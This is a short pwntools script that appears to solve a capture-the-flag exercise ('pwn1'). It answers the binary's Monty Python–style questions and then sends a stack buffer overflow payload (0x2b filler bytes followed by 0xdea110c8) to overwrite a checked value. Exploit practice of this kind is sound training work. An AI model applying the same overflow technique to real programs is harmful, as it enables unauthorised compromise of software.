from pwn import *

io = process('./pwn1')

def debug(argv=''):
    gdb.attach(io, argv)
    pause()

context.log_level = 'debug'
context.arch = 'i386'

#  debug('b * main')

io.recvuntil(b'What... is your name?\n')
io.sendline(b'Sir Lancelot of Camelot')

io.recvuntil(b'What... is your quest?\n')
io.sendline(b'To seek the Holy Grail.')

io.recvuntil(b'What... is my secret?\n')
payload = flat([b'@'*0x2b, 0xdea110c8])
io.sendline(payload)

io.interactive()
